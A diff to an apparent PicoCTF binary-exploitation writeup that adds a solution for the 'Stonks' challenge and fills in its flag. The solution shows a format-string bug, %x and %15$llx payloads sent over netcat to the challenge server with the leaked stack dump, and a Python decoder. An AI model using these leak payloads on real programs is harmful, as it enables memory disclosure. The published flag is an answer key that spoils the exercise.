@@ -1,4 +1,4 @@
-# [PicoCTF](./picoctf.md) Binary Exploitation [0/22]
+# [PicoCTF](./picoctf.md) Binary Exploitation [1/22]
 
 Binary exploitation is the process of subverting a compiled application such that it violates some trust boundary in a way that is advantageous to you, the attacker.
 
@@ -440,8 +440,113 @@ int main(int argc, char *argv[])
 
 <summary markdown="span">Solution 1</summary>
 
-solution details
+Reviewing the source code, it can be seen that the flag is opened and stored in api_buf:
 
+~~~c
+char api_buf[FLAG_BUFFER];
+FILE *f = fopen("api","r");
+if (!f) {
+  printf("Flag file not found. Contact an admin.\n");
+  exit(1);
+}
+fgets(api_buf, FLAG_BUFFER, f);
+~~~
+	
+The source code shows an obvious format string vulnerability in the buy_stonks function:
+	
+~~~c
+char *user_buf = malloc(300 + 1);
+printf("What is your API token?\n");
+scanf("%300s", user_buf);
+printf("Buying stonks with token:\n");
+printf(user_buf);
+~~~
+
+We can use a pointer to see if this vulnerability is present:
+
+~~~shell
+$ nc mercury.picoctf.net 33411
+Welcome back to the trading app!
+
+What would you like to do?
+1) Buy some stonks!
+2) View my portfolio
+1
+Using patented AI algorithms to buy stonks
+Stonks chosen
+What is your API token?
+%x
+Buying stonks with token:
+84f53f0
+Portfolio as of Sun Jan 16 18:26:48 UTC 2022
+
+
+1 shares of X
+14 shares of M
+1 shares of WSLH
+130 shares of OVFC
+Goodbye!
+~~~
+
+This returns the value 84f53f0 which is the value at the top of the stack.  The input %x.%x...%x.%x will pop the number of "%x" stack values and print them.  Re-running the program with lots of "%x." can return the stack:
+	
+~~~shell
+$ nc mercury.picoctf.net 33411
+Welcome back to the trading app!
+
+What would you like to do?
+1) Buy some stonks!
+2) View my portfolio
+1
+Using patented AI algorithms to buy stonks
+Stonks chosen
+What is your API token?
+%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
+Buying stonks with token:
+9d273b0.804b000.80489c3.f7f6bd80.ffffffff.1.9d25160.f7f79110.f7f6bdc7.0.9d26180.4.9d27390.9d273b0.6f636970.7b465443.306c5f49.345f7435.6d5f6c6c.306d5f79.5f79336e.63343261.36613431.fff7007d.f7fa6af8.f7f79440.550fb100.1.0.f7e08be9.f7f7a0c0.f7f6b5c0.f7f6b000.fff7c628.f7df958d.f7f6b5c0.8048eca.fff7c634.0.f7f8df09.804b000.f7f6b000.f7f6be20.fff7c668.f7f93d50.f7f6c890.550fb100.f7f6b000.804b000.fff7c668.8048c86.9d25160.fff7c654.fff7c668.8048be9.f7f6b3fc.0.fff7c71c.fff7c714.1.1.9d25160.550fb100.fff7c680.0.0.f7daef21.f7f6b000.f7f6b000.0.f7daef21.1.fff7c714.fff7c71c.fff7c6a4.1.0.f7f6b000.f7f8e70a.f7fa6000.0.f7f6b000.0.0.243ba1c2.7e6b67d2.0.0.0.1.8048630.0.f7f93d50.f7f8e960.804b000.1.8048630.0.8048662.8048b85.
+Portfolio as of Sun Jan 16 18:46:11 UTC 2022
+
+
+4 shares of HR
+89 shares of UMEM
+133 shares of GSXU
+442 shares of SBPJ
+492 shares of C
+695 shares of KK
+Goodbye!
+~~~
+
+The 15th item in the stack appears to be ASCII (6f636970).  We can take the ASCII encoded hex bytes from the 15th point in the stack using:
+
+~~~
+%15$llx.%16$llx.%17$llx.%18$llx.%19$llx
+~~~
+
+This returns:
+
+~~~
+7b4654436f636970.345f7435306c5f49.306d5f796d5f6c6c.633432615f79336e.ffd1007d36613431
+~~~
+
+which we can use Python to recover the flag:
+	
+~~~py
+import binascii
+a = "7b4654436f636970.345f7435306c5f49.306d5f796d5f6c6c.633432615f79336e.ffd1007d36613431"
+b = a.split(".")
+flag= ""
+for i in range(len(b)):
+    buffer = binascii.unhexlify(b[i].encode())[::-1]
+    for j in range(len(buffer)):
+        try:
+            flag += chr(buffer[j])
+        except:
+            continue
+print(flag)
+~~~
+	
+This returns the flag.
+	
 </details>
 
 ### Answer
@@ -451,7 +556,7 @@ solution details
 <summary markdown="span">Flag</summary>
 
 ~~~
-picoCTF{}
+picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}
 ~~~
 
 </details>
